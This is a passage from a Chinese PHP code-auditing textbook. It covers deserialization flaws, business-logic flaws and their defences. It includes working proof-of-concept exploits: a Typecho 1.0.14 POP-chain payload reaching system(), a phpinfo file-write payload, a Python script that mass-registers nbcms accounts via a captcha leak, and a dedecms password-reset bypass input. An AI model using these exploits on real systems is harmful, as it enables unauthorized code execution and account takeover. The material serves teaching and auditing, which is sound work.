  Integer类型序列化

在PHP语言中interger类型数据序列化后为i:<number>，其中<number>为一个整数型，范围是-2147483648至2147483647，数字前面可以有正负号。如果被序列化的数字超过该范围，则会被序列化为浮点型。例如：序列化的数字123，序列化后的结果为i:123。

  double类型序列化

在PHP语言中double类型数据序列化后为d:<number>，其中<number>为一个浮点型，例如：序列化的数字1.5，序列化后的结果为d:1.5。

  string类型序列化

在PHP语言中string类型数据序列化后为s:<length>:”<value>”，其中<length>为字符串长度，<value>为字符串数值。例如：序列化string类型数据test，序列化后的结果为s:4:”test”。

### 10.4.2 反序列化漏洞介绍

（1）反序列化漏洞基础知识

PHP中反序列化漏洞的产生主要有以下两个原因：

l unserialize函数的参数可控。

l 魔术函数调用。

PHP将所有以__开头的函数保留为魔术函数，所以在定义类方法时不要以__作为前缀，PHP的魔术函数包括：__construct、__destruct、__call、__callStatic、__get、__set、__isset、__unset、__sleep、__wakeup、__toString、__invoke、__set_state、__clone和__debuginfo等成员函数。

  __construct函数

具有构造方法的类会在每次创建新对象时先调用该方法。

  __destruct函数

该函数会在对某个对象的所有引用都被删除或对象被显示销毁时执行。

  __sleep函数

serialize函数会检查类中是否存在__sleep函数，如果存在则先被调用，然后才执行序列化操作。

  __wakeup函数

unserialize函数会检查是否存在__wakeup函数，如果存在则会调用__wakeup函数，预先准备对象需要的资源。

  __toString函数

当一个对象被当做字符串使用时，将默认调用__toString函数，将其转化为字符串。

（2）通过反序列化漏洞可以控制函数中参数值，从而使得程序错误执行，案例代码如下：



<?php

highlight_file(__FILE__);

class a{

  var $test = 'hello';

  function __destruct(){

//当构造a对象时打开hello.php文件，向该文件中写入$test->test值

​    $fp=fopen("/var/www/html/hello.php","w");

​    fputs($fp,$this->test);

​    fclose($fp);

  }

}

//通过re参数获取值给$class变量

$class=stripslashes($_GET['re']);

//对$class变量进行反序列

$class_unser=unserilalize($class);

require '/var/www/html/hello.php';

?>



上述代码存在反序列漏洞，其主要原因是：

unserialize函数的参数$class可控。同时，存在__destruct函数，此函数会将$this->test值写入/var/www/html/hello.php文件中。

（3）下面给出漏洞利用过程：

通过参数re传入的值来实例化类a，并且改变$test的值。因为__destruct函数可以将$test的值写入hello.php文件中，所以可以利用该函数将PHP代码传入hello.php文件中。

首先实例化对象：



<?php

class a{

  var $test='<?php phpinfo();?>';

}

$a = new a();

$class_ser = serialize($a);

print_r($class_ser);

?>



输出为O:1:"a":1:{s:4:"test";s:18:"<?php phpinfo();?>";}，将对象的序列化结果通过HTTP的GET方式传递，为hello.php文件写入恶意代码，其构造的POC如下：

http://ip/index.php?re= O:1:"a":1:{s:4:"test";s:18:"<?php phpinfo();?>";}

然后访问http://ip/hello.php可输出phpinfo信息，如图10-10所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image498.gif)

图10-10 反序列化漏洞测试图

## 10.5 反序列化漏洞CMS实践

### 10.5.1  实验：Typecho1.0.14反序列化审计

· 实验介绍

本实验将对Typecho 1.0.14进行代码审计工作，审计该CMS中是否存在反序列化漏洞。Typecho是一个基于PHP5开发的开源博客CMS系统，在1.0.14版本中存在反序列化漏洞，主要是install目录下的install.php文件内使用了unserialize函数反序列化，而Typecho_Cookie类的get()方法获取的__typecho_config参数存在一些危险可控的操作（调用了魔法函数），并且对__typecho_config参数没有任何过滤，导致可以通过POP利用链注入恶意的反序列化对象，执行任意PHP代码。

· 预备知识

参考10.4.1节：序列化介绍；10.4.2节：反序列化漏洞介绍。

· 实验目的

掌握反序列化漏洞的审计方法。

· 实验环境

Windows操作系统主机；Typecho 1.0.14安装包；PhpStorm工具。

· 实验步骤

（1）审计阶段

由于build\install.php文件中具有unserialize函数调用反序列化，因此可以对该文件的关键代码进行审计，其代码如下：



// 挡掉可能的跨站请求

if (!empty($_GET) || !empty($_POST)) {

**//如果HTTP请求头中不存在referer将直接退出**

  **if (empty($_SERVER['HTTP_REFERER'])) {exit;}**

  $parts = parse_url($_SERVER['HTTP_REFERER']);//对referer进行解析工作

  if (!empty($parts['port']) && $parts['port'] != 80) {

​    $parts['host'] = "{$parts['host']}:{$parts['port']}";}//拼接主机与端口

  if (empty($parts['host']) || $_SERVER['HTTP_HOST'] != $parts['host']) {//检查referer是否正确，若不正确则直接退出

​    exit;}}

…省略…

<?php

 **$config =** **unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')));**

 Typecho_Cookie::delete('__typecho_config');

 $db = **new Typecho_Db($config['adapter'], $config['prefix']);**

 $db->addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);

 Typecho_Db::set($db);

?>



  上述代码重点部分：

l install.php源文件首先接收了请求中的finish参数，然后校验了HTTP_REFERER字段，因此提交的请求中HTTP_REFERER字段不能为空。

l Typecho_Cookie类获取了__typecho_config参数的内容并进行base64解密，又调用了unserialize函数对__typecho_config反序列化。

l 将反序列化后的$config传给了Typecho_Db类。

l 反序列化的可控点大概率在Typecho_Cookie::get('__typecho_config')处。

因此，需要对Typecho_Cookie的静态方法get进行分析（确定可控点），代码如下：



public static function get($key, $default = NULL){

  $key = self::$_prefix . $key;

  **//****获取__typecho_config的内容，从Cookie的__typecho_config字段获取值**

  $value = **isset($_COOKIE[$key]) ? $_COOKIE[$key] : (isset($_POST[$key]) ? $_POST[$key] :$default)**;

  return is_array($value) ? $default : $value;

}



上述代码可知，get函数主要是从Cookie中获取到__typecho_config的内容并返回，由于Cookie是可以更改的，这意味着__typecho_config是可控的。根据之前我们学习反序列化漏洞的原理可知，既然是反序列化操作，并且__typecho_config是可控的, 下一步就是分析反序列操作中执行了魔法函数从而确定利用的pop链了。

（2）反序列化pop链分析

经过分析确定了反序列化后结果参数$config传给了Typecho_Db类用于创建对象，在创建对象过程中自动调用魔法函数__construct，因此对Typecho_Db类的__construct函数进行审计，代码如下：



public function __construct($adapterName, $prefix = 'typecho_'){

  /** 获取适配器名称 */

  $this->_adapterName = $adapterName;

  /** 数据库适配器 *///将adapter与字符串进行拼接

  **$adapterName = 'Typecho_Db_Adapter_' . $adapterName;**

  if (!call_user_func(array($adapterName, 'isAvailable'))) {

​    throw new Typecho_Db_Exception("Adapter {$adapterName} is not available");

}

…省略…}



直接跳转到了Typecho_Db类的定义中，__construct构造函数对传入的参数进行初始化，在第三行代码中将Typecho_Db_Adapter字符串和变量adapterName进行拼接了，值得注意的是：此时adapterName是一个对象，当把adapterName对象当作字符串进行拼接时，程序将自动调用该对象的__toString()魔法函数，并且由于adapterName可控，如果将adapterName指向一个类的话，那么就可能造成反序列漏洞。

经过分析可知$config数组中的adapter元素其实是Typecho_Feed对象。因此，需要对Typecho_Feed对象的__toString()方法进行审计，其代码如下：



public function __toString(){

  ……

  $content .= '<dc:creator>' . htmlspecialchars(**$item['author']->screenName**) . '</dc:creator>' . self::EOL;

  ……

}



__toString方法只给出部分关键代码，有一行代码访问了$item['author']->screenName 。根据前面分析可知，$item是Typecho_Feed中的一个属性，$item的数据类型是一个数组并且可控的，那么$item['author']也是可控的，如果将$item['author']指向一个不存在screenName属性的类，那么$item['author']->screenName实际上是访问了一个对象中不存在的属性，这时候系统将就会调用其__get()魔法函数。

接下来pop漏洞利用链的方向就是需要找到一个没有screenName属性，并且调用了__get()魔法函数的类，最终找到Typecho_Request类。那么我们在poc中要构造Typecho_Request类，继续跟进分析__get()函数。

__get()魔法函数内部实际上是调用了get函数，既然参数key是可控的，那么value也是可控的，通过this对象的_params属性来访问screenName的内容，调用了_applyFilter函数。其代码如下：



  private function _applyFilter($value) {

​    if ($this->_filter) {

​      foreach ($this->_filter as $filter) {

​        //回调函数

​        **$value = is_array($value) ? array_map($filter, $value) :**

​        **call_user_func($filter, $value);**

​      }

​      $this->_filter = array();}

​    return $value;}



实际上是调用了Typecho_Request类的_applyFilter函数，该函数内部调用了array_map函数和call_user_func函数，并将value和Typecho_Request对象的_filter属性作为参数（这两个参数都是可控的），并且这两个PHP内置的系统函数会自动为参数调用回调函数，filter是回调函数，value是回调函数的参数（call_user_function是代码执行漏洞危险函数）。_applyFilter函数内部没有对value和filter做任何的过滤，最终导致反序列化漏洞的利用。

至此，给出该反序列化漏洞的完整pop链，如图10-11所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image500.gif)

图10-11 POP利用链图

（3）构造漏洞利用POC

通过上述的POP链分析，编写出该反序列化漏洞的POC，代码如下：



<?php

class **Typecho_Feed**{

  const RSS2 = 'RSS 2.0';

  private $_type;

  private $_items;

  public function __construct(){

​    //__toString函数检查

​    $this->_type = self::RSS2;

​    //触发__get函数

​    $_item['author'] = new **Typecho_Request()**;

​    //触发错误

​    $_item['category'] = array(new Typecho_Request());

​     $this->_items[0] = $_item;}

}

class **Typecho_Request**{

  private $_params = array();

  private $_filter = array();

  public function __construct(){

​    //回调函数的参数

​    $this->_params['screenName'] = "dir";

​    //回调函数

​    $this->_filter[0] = "system";}

}

$data = new Typecho_Feed();

$poc = array('adapter' => $data,'prefix' => "typecho_");

//序列化

$s = serialize($poc);

//base64编码

echo base64_encode($s);

?>



  利用结果如图10-12所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image502.gif)

图10-12 反序列化漏洞利用结果图

## 10.6 单元小结

本单元主要学习了代码审计中的变量覆盖漏洞、反序列化漏洞安全问题，通过对常见漏洞函数进行列举，使读者熟悉常见的审计变量覆盖漏洞的方法。与此同时，给出存在漏洞的CMS审计流程，例如：phpcms2008。给出PHP中的反序列化漏洞与代码案例分析。

本单元要求读者着重掌握变量覆盖、反序列化漏洞中常见函数的PHP代码形式，并通过对小型CMS的代码走读审计代码其中存在的漏洞。下图9-11为变量覆盖与反序列化总结图。



 

# 单元11 业务功能审计

与传统类型漏洞相比，业务逻辑漏洞没有明显的敏感函数且不容易被发现。网站中很多业务功能都将存在业务逻辑漏洞，包括：弱类型安全问题、用户验证码功能、密码找回功能、充值支付功能漏洞，本单元分为四部分进行介绍。

第一部分介绍PHP语言中的弱类型安全问题，包括：is_numeric()、in_array()、strcmp()、双等于与三等于判断。

第二部分介绍验证码功能漏洞的基础知识，包括：验证码功能的介绍、验证码功能常见的安全问题、验证码绕过的方法，并使用NBCMS对验证码功能漏洞进行审计实践。

第三部分介绍密码重置功能漏洞，包括：密码重置漏洞介绍、密码重置漏洞的常见案例，并使用dedecms对密码重置功能漏洞进行审计实践。

第四部分介绍交易支付功能漏洞的基础知识，包括：交易支付功能漏洞介绍、交易支付功能漏洞的挖掘与防御、交易支付漏洞的常见安全问题。

**单元构图：**

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image504.jpg)

**单元目标：**

\1.  了解PHP中的弱类型安全问题；

\2.  熟悉验证码功能漏洞的常见问题；

\3.  熟悉密码重置功能漏洞的常见安全问题；

\4.  掌握交易支付功能漏洞的常见安全问题。

## 11.1 验证码功能漏洞

### 11.1.1 验证码功能介绍

验证码功能常被用于网站用户注册、账户安全登录、忘记密码、确认下单等应用场景，特别是一些涉及到用户个人敏感行为时候，为了确认操作是用户本人执行，通常会使用验证码进行二次认证。验证码的形式也多种多样，其主要包括：图片验证码、滑动验证码、短信/邮箱验证码、二维码等形式。早期网站中很多验证码功能都存在爆破或机器识别的安全问题。

### 11.1.2 验证码功能常见安全问题

本小节将对验证码功能的安全问题进行介绍，其主要包含换以下四种：

（1）短信验证码轰炸

该问题主要是由于网站程序设计时未对短信验证码进行重发限制或限制时间间隔过短导致。该安全问题往往出现在一些小型网站中，近几年很少存在通过HTTP GET请求发送短信验证码了，基本都是使用HTTP POST请求，攻击者通过使用BurpSuite抓包软件可以重放（Repeater）请求，对于后端没有做限制的网站就可以达到短信轰炸效果。

针对短信验证码轰炸问题，给出如下几点防御措施：

l 设置发送间隔，即单一用户发送请求后，与下次发送请求时间需要间隔60秒。

l 设置单用户发送上限，即设置每个用户单位时间内发送短信数的上限，如果超过阈值就不允许今天再次调用短信接口（阈值根据业务情况设置）。

l 根据IP地址设置短信发送上限，这种情况可预防多用户发送短信攻击的场景。

（2）无效验证

某些网站中虽然有验证码模块，但验证模块与业务功能没有关联性，从而形成了无效验证安全问题，其主要包括：

l 验证码校验无效

获取短信验证码后，随意输入验证码即可校验通过。然后，直接输入两次密码可成功更改用户密码，没有对短信验证码进行验证，可能导致CSRF等问题。

l 任意用户注册

利用手机号接收验证码进行验证，跳转到用户注册页面。通过使用BurpSuite抓包篡改手机号，使用任意手机号进行注册。

（3）验证码绕过

验证码绕过的方式存在很多种，包括：通过修改请求包内容、修改响应包内容、验证码为空绕过、验证码爆破等。

（4）任意用户操作

正常情况下，用户的短信验证码仅能使用一次。但是，若验证码和手机号未绑定且验证码在一段时期内都有效，则可能出现如下情况：

用户A手机的验证码，用户B可以拿来使用；用户A手机在一定时间间隔内接到两个验证码都可使用。这将导致验证码功能的任意用户操作安全问题。

### 11.1.3   验证码绕过方式

（1）   修改响应包返回值绕过验证

客户端在本地主机判断验证码是否正确，但是该判断结果能够在本地进行修改。例如：验证码正确返回状态值为success，失败返回的状态值为false，通过修改返回状态为success，即可绕过验证并重置用户密码。

下面给出应用场景：

l 网站中忘记密码功能。通过修改短信验证的响应报文绕过身份验证，成功修改其他人密码。下面给出使用BurpSuite拦截响应包，将其返回状态从error修改为OK，从而成功修改密码案例，如图11-1所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image506.gif)

图11-1 修改返回状态图

l 网站中用户注册功能。通过修改短信验证的响应报文并替换为自己的手机号，绕过验证码的限制，造成任意用户注册功能。下图11-2为某网站用户注册模块，在注册页面实现任意用户注册。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image508.jpg)

图11-2 网站用户注册图

l 有些登录也存在类似的问题，随便输入账号密码，拦截返回的响应包，将包替换为A账号密码正确的登录返回响应包（前提是A账号的Cookie是有效的），即可登录到A账号。

（2）   验证码置空绕过验证

在网站的短信验证码处输入错误验证码会进行校验，但是如果验证码为空则不进行校验从而绕过验证。图11-3为某网站登录功能中短信验证码登录时使用BurpSuite抓取的数据包，将code参数置为空，即可登录任意账户。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image510.gif)

图11-3 验证码置空绕过图

（3）   验证码过短爆破绕过

有的短信验证码位数太短，采用4为纯数字的短信验证码作为登录的凭证，此类网站若没有对短信验证码进行次数限制，就很容易采用工具进行爆破验证码登录。例如：对于重置密码功能，其会根据短信验证码判断是否能修改成功，该功能的验证码是四位纯数字可以进行爆破。通过BurpSuite拦截数据包，并对拦截数据code=4935&mobile=18556530793&pwd=123456a进行爆破，结果如图11-4所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image512.gif)

图11-4 验证码爆破图

（4）   利用接口标记绕过短信限制

网站中的注册、忘记密码、修改密码功能，均可能存在短信验证功能。该网站将可能根据设置的参数值不同，来判断其执行的功能。例如：当type=1时为注册，当type=2时为忘记密码，当type=3时为修改密码等。攻击者可以通过修改参数type的值，来绕过一分钟内只发送一次的时间限制，达到短信轰炸的目的。

（5）   利用空格绕过短信限制

通过在参数值的前面加上空格，进行绕过一天内发送次数的限制。例如：mobile=”13211111111”，一天可以发送10次，超过10次今天将不再发送，第二天才可以继续发送。但是，可以通过在手机号前面或后面加上空格又可以发送10次。比如，mobile= “ 13211111111”，前面加个空格，就可以再次发送成功。

（6）   通过修改Cookie值绕过短信限制

有些网站的发送短信次数是根据Cookie值进行判断的，由于该Cookie值未使用登录状态下的Cookie而是使用普通状态下的Cookie。因此可通过修改当前Cookie值来验证发送次数并绕过短信次数限制。

图11-5为BurpSuite拦截短信校验的数据包，将数据包中的JSESSIONID进行修改，将参数值的node2修改为node3测试发送数据包，并返回正确的数据包从而绕过短信校验次数限制。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image514.gif)

图11-5 修改JSESSIONID图

（7）   手机号替换获取验证码

有些网站在修改别人的信息时，需要短信认证。在发送短信时，可以尝试将手机号替换为攻击者的来获取短信验证码。如果服务端只检查验证码是否正确，而不进行手机号和验证码匹配检测，攻击者就可以绕过认证。

例如：在发送短信时拦截数据包，将手机号替换为攻击者的手机号并发送。然后再输入得到验证码进行验证，如果此时验证码正确，即可绕过。

### 11.1.4 实验：验证码功能漏洞导致任意用户注册实践

· 实验介绍

本实验将对nbcms进行代码审计工作，审计该CMS中是否存在验证码功能漏洞。

· 预备知识

参考11.1.1节：验证码功能介绍；11.1.2节：验证码功能安全问题；11.1.3节：验证码绕过。

· 实验目的

掌握验证码功能漏洞的审计方法。

· 实验环境

Windows操作系统主机；nbcms安装包；PhpStorm工具。

· 实验步骤

（1）审计阶段

点击展开api/captcha/captcha.php，代码如下。程序流程：

l 代码为if(!isset($_GET['code']))，isset函数用来判断当前传入的变量是否赋值。若赋值失败则调用一个自定义函数createcaptcha()，该函数功能为判断其用来生成邀请码。

l 代码为if($_SESSION['captcha']==strtolower(trim($_GET['code'])))，接收GET中的code值与SESSION中的captcha值进行比较，若等于则提示成功，若不等于则会把程序的GET方式获取的code值和SESSION中的验证码值打印出来。打印的内容将导致用户可以利用该提示批量注册用户。



```
<?php
   include substr(dirname(__FILE__),0,-12).'/include/common.inc.php';
//判断code是否设置值
   if(!isset($_GET['code']))
   {createcaptcha();//若未设置则调用createcaptcha函数}
   else{
if($_SESSION['captcha']==strtolower(trim($_GET['code'])))
{exit('ok');//若code值与SESSION中的captcha值进行比较，若等于则提示成功}
     else{exit('error'.$_GET['code'].'-'.$_SESSION['captcha']);}
}
?>
```



  请求路径为http://ip/nbcms/api/captcha/captcha.php获得网站的验证码图片，如图11-6所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image516.gif)

图11-6 获取网站验证码图

请求路径为http://ip/nbcms/api/captcha/captcha.php?code=123获得网站的code值与验证码图片值，形式为“error code-验证码”，如图11-7所示。而解析得到的验证码可用来直接注册新用户导致任意用户注册漏洞。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image518.gif)

图11-7 code值与验证码图

（2）利用阶段

图11-8为该CMS利用流程图，首先通过发送请求/api/captcha/captcha.php?code=123解析出验证码，然后使用解析的验证码及用户其他信息构造注册用户数据发送请求至/member/index.php?file=login&modelid=1&action=register1，创建新用户。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image520.jpg)

图11-8 漏洞利用流程图

使用的自动注册用户POC如下：



\# coing=utf-8

​    import requests,random

​    def reg(urls,i):

​     url = urls+'**/api/captcha/captcha.php**'    //发送的第一个请求url

​     **one = requests.get(url)          //****第一个请求返回定义为one**

​      url1 = urls+'**/api/captcha/captcha.php?code=123**'//发送的第二个请求url

​      headers = {              //定义HTTP请求头为headers变量

​     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',

​     'Content-Type': 'application/x-www-FORM-urlencoded',

​      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',

​     'Cookie': one.headers['Set-Cookie']}

​    **two = requests.get(url1,headers=headers)//****发送第二个请求返回定义为two**

​    **code = str(two.text).split('error123-')[1]//****请求返回two得到验证码code**

​    **url2 = urls+'/member/index.php?file=login&modelid=1&action=register1'**

​                 **//发送的第三个请求url2，用于注册新用户的请求**

​    name = str("anhoulin")+str(i)//定义用户名

​    data = {                    //定义发送请求的请求体

​        'do_submit':'1',

​        'modelid':'1',

​        'username':name,

​        'email':str(name)+str('@qq.com'),

​        'password':'123123A',

​        'password2':'123123A',

​        'inputcheckcode':code,

​      }

​    **three = requests.post(url2,data=data,headers=headers) //****发送请求url2**

​    if str(three.text).find('注册成功！') != -1:  //判断是否显示注册成功

​      return "账户："+str(name)+'<=====>密码：123456A'//显示注册用户密码

​    else:

​      return "注册失败！"               //显示注册失败

​    if __name__ == "__main__":

​      for i in range(1,50):

​        content = reg(r"http://www.tp.cc",i)

​        print(content)



## 11.2 密码重置功能漏洞

### 11.2.1 密码重置功能介绍

网站中密码重置漏洞出现的功能点主要包括以下形式：

l 网站中的个人服务中心中修改密码进行重置。

l 网站中自带的忘记密码找回功能进行密码重置。

密码找回功能由于其交互流程过多，导致其是出现漏洞最多的功能点。找回密码的方式比较常见的有手机验证码、邮箱验证码等，其主要流程如图11-9所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image522.jpg)

图11-9 密码找回流程图

网站中的密码重置功能本身不存在漏洞，但如果对密码重置功能的验证机制不够完善将形成密码重置漏洞，常见的漏洞形式包括：

l 验证码较弱；

l 密码凭证可以从客户端获取；

l 凭证易被拆解；

l 利用已知邮箱或手机号重置其他用户密码；

l 发送密码阶段可修改其他用户密码。

### 11.2.2 密码重置功能的常见案例

（1） 验证码不失效导致密码重置

网站中找回密码时获取的验证码仅用于判断是否正确，而缺少判断验证码是否过期的时间限制。这将导致攻击者可进行爆破找到正确的验证码，对用户密码重置。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image524.jpg)

图11-10 验证码校验流程图

如图11-10为验证码校验基本流程图，攻击者对验证码进行校验的数据包进行拦截，并使用BurpSuite进行暴力破解，反复执行上述流程最终获得正确的验证码。

（2） 验证码直接返回

网站中输入手机号后点击获取验证码，验证码在客户端生成，并直接返回响应数据包（该数据包中存在验证码）以便对比验证码。攻击者可通过拦截响应数据包直接获得正确的验证码从而进行密码重置。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image526.jpg)

图11-11 验证码获取流程图

图11-11为验证码获取基本流程图，其测试方法是：直接输入目标手机号，点击获取验证码，并观察返回包即可。在返回包中得到目标手机号获取的验证码，进而完成验证，重置密码成功。

（3） 验证码未绑定用户

网站中输入手机号和验证码进行重置密码时，仅判断验证码是否正确进，而未对验证码是否与手机号匹配进行校验，图11-12为验证码验证流程图。

测试方法：在提交手机号和验证码时，替换手机号为他人手机号进行测试，成功通过验证并重置他人密码。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image528.jpg)

图11-12 验证码验证流程图

（4） 跳过验证步骤修改密码

网站中对修改密码的步骤未进行校验，导致可以直接输入最终修改密码的网址，直接跳转到该页面，最后输入新密码达到重置密码的目的。

测试方法：首先使用自己的账号对密码重置流程进行测试，获得该流程中每个步骤的链接。然后记录页面中对应的输入新密码链接，例如：https://xxx/page/login/veifyAccess.html?username=anhl&email=anhl@xxx.com.cn，重置他人用户时，获得验证码后，直接输入页面链接到新密码的界面，重置密码成功，如图11-13为跳过验证步骤修改密码的流程图。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image530.jpg)

图11-13 修改密码流程图1

（5） 未校验用户字段的值

在整个重置密码流程中，只对验证码和手机号做了校验，未对后面设置新密码的用户身份做判断，导致在最后一步通过修改用户身份来重置他人密码。

测试方法：使用自己的手机号测试修改密码流程，在最后一步设置密码时，页面参数只有用户名和密码且Cookie值无效，只需要修改数据包里的用户信息，就可以重置密码，图11-14为缺少身份判断而修改密码的流程图。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image532.jpg)

图11-14 修改密码流程图2

（6） 修改密码处id可被替换

在整个重置密码流程中，没有对原密码进行判断，且根据id的值来修改用户的密码，类似的SQL语句为：update user set password=”qwer1234” where id = ‘1’。修改数据包里的id值即可修改他人的密码。如图11-15为修改密码处id的基本流程图。

测试方法：使用BurpSuite抓取修改自己用户密码的数据包，替换数据包中用户对应的id值，即可修改他人的密码。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image534.jpg)

图11-15 修改密码处id流程图

（7） Cookie值替换

在整个重置密码流程中，重置密码最后步骤时仅判断唯一的用户标识Cookie是否存在，并没有判断该Cookie有没有通过之前重置密码过程的验证，这导致攻击者可通过替换Cookie的方式重置他人用户密码，流程图如图11-16所示。

测试方法：重置自己用户密码到达最后阶段并抓取数据包，在第一阶段获取目标用户Cookie后，替换Cookie到已经抓取的数据包中，并进行发包测试。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image536.jpg)

图11-16 修改密码处id流程图

下面给出通过替换Cookie值来修改其他用户密码的案例，如图11-17所示。首先通过密码找回功能获取用户wangshuai的Cookie值，抓取该用户数据包的Cookie值为JSESSIONID=E1AC27A7302C03C9432DE2254B99311A。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image538.jpg)

图11-17 修改密码案例图

重置自己用户密码最后一步抓取的数据包，如图11-18所示，并将其中的Cookie值进行替换，从而重启用户wangshuai的密码。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image540.jpg)

图11-18 重置密码数据包

（8） 修改个人信息时替换隐藏字段值

在执行修改信息的SQL语句时，用户的密码也被当做字段执行了，而且是根据隐藏参数loginid来执行的。这样攻击者可通过修改隐藏参数loginid的值，从而修改其他用户的密码，其流程图11-19所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image542.jpg)

图11-19 通过隐藏参数修改密码流程图

测试方法：在修改个人资料的时候，抓取数据包。然后修改数据包的参数和对应的值，参数名一般可以在其他位置找到，通过替换隐藏参数的方法即可修改他人的密码等信息。下面给出某网站通过修改用户个人信息重置密码的案例，其个人信息维护页面如图11-20所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image544.jpg)

图11-20 修改个人信息图

上述更新个人信息的页面代码如图11-21所示，该页面源代码找到了一个参数loginId，该参数是对应用户身份。

其访问超链接为：href=”/ua/login/login.php?loginId=xxx”。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image546.gif)

图11-21 修改个人信息前台代码

更新个人信息抓取的数据包如图11-22所示，在数据包中添加隐藏字段loginId并将值修改为他人的用户，发包返回修改成功。即可成功的将用户密码修改为其他用户密码。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image548.jpg)

图11-22 更新个人信息数据包图

### 11.2.3 密码重置功能防御方法

  下面给出密码重置功能的防御方法：

l 较少密码重置过程中的用户可控参数；

l 增加网站验证码功能处的复杂度；

l 限制验证码错误填写的次数；

l 增加验证码错误失效时间；

l 对验证用户、手机号和邮箱等关键模块位置添加验证码。

### 11.2.4   实验：任意用户密码重置实践

· 实验介绍

本实验将对dedecms V5.7进行代码审计工作，审计该CMS中是否存在任意用户密码重置漏洞。

· 预备知识

参考10.2.1节：密码重置漏洞介绍；10.2.2节：密码重置漏洞的常见案例。

· 实验目的

掌握密码重置漏洞的审计方法。

· 实验环境

Windows操作系统主机；dedecms V5.7安装包；PhpStorm工具。

· 实验步骤

（1） 审计阶段

进入member/resetpassword.php页面，代码如下。程序流程：

l 首先接收id参数，并用正则表达式将非数字替换为空字符。

l 然后利用id参数拼接成SQL语句进行数据库查询。

l 获取safequestion和safeanswer两个参数，如果为空直接将参数置为空。

l 将数据库查询的结果$safeanswer、问题$safequestion和正确答案进行对比，如果成功则调用sn函数修改密码。



else if($dopost == "safequestion"){
   $mid = preg_replace("#[^0-9]#", "", $id);//将特殊字符替换为空字符
   $sql = "SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = '$mid'";                //拼接SQL语句
   $row = $db->GetOne($sql);        //执行SQL语句
   if(empty($safequestion)) $safequestion = '';
   if(empty($safeanswer)) $safeanswer = '';
   if(**$row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer**){

//如果$safeanswer与$safequestion都正确则调用sn函数
     **sn**($mid, $row['userid'], $row['email'], 'N');
     exit();}
   else{ShowMsg("对不起，您的安全问题或答案回答错误","-1");
     exit();
   }}



代码$row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer存在漏洞。因为判断使用的双等号“==”，而双等号判断的时候并不会检测类型 ，从而错误的判断数据相等。如果用户在进行用户注册时，未设置问题和答案，程序会自动把问题（safequestion）设置为0、答案（safeanswer）设置为空，将导致漏洞的利用。如果传输内容为“safequestion=0.0&safeanswer=”则可直接绕过if判断进入密码修改部分。

注意：读者可能有个问题：为什么传递值0.0而不传输0，如果传输值为0的话”0”==”0”将直接绕过if判断。但此时存在问题：safequestion需要被empty函数检测，当empty检测传输值为“0”，则会返回true，if判断捕捉到为真，会直接将$safequestion = ''，而“0”==“”结果为false，则无法绕过判断。

成功绕过判断语句后，程序将调用sn函数，因此需要对sn函数进行审计，该函数代码如下：



function sn($mid,$userid,$mailto, $send = 'Y')
 {
   global $db;
   $tptim= (60*10);
   $dtime = time();
   $sql = "SELECT * FROM #@__pwd_tmp WHERE mid = '$mid'";
   $row = $db->GetOne($sql);
   if(!is_array($row))
   {  //发送新邮件；
     newmail($mid,$userid,$mailto,'INSERT',$send);}
  …省略…}



程序首先使用函数传输的mid拼接SQL语句为SELECT * FROM #@__pwd_tmp WHERE mid = '$mid'，查询#@__pwd_tmp表中mid与变量$mid相等的数据。若查询结果$row不是数组就调用newmail函数发送邮件。

newmail函数代码利用random()生成随机数，然后进入到type==’UPDATE’,将randval随机值进行md5加密，并更新到dede__pwd_tmp表中。更新数据后程序会进入到send==‘N’流程，会把临时密码以key的形式泄露到响应报文中，代码如下：



elseif($type == 'UPDATE')
 {  //将任意数进行md5加密
   **$key = md5($randval);**
